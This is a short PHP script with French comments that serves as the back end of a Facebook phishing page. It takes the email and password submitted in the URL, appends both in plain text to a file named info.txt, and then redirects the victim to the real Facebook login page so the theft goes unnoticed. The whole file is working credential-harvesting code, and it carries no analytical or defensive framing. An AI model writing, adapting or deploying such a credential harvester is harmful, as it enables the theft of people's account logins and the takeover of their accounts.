<?php
  // Récupération des données du formulaire
  $username = $_GET['email'];
  $password = $_GET['pass'];

  // Enregistrement des données dans info.txt
  $log = fopen("info.txt", "a");
  fwrite($log, "Nom d'utilisateur: " . $username . ", Mot de passe: " . $password . "\n");
  fclose($log);

  // Redirection vers votre adresse
  header("Location: https://www.facebook.com/login/web/?email=&is_from_lara=1");
  exit;
?>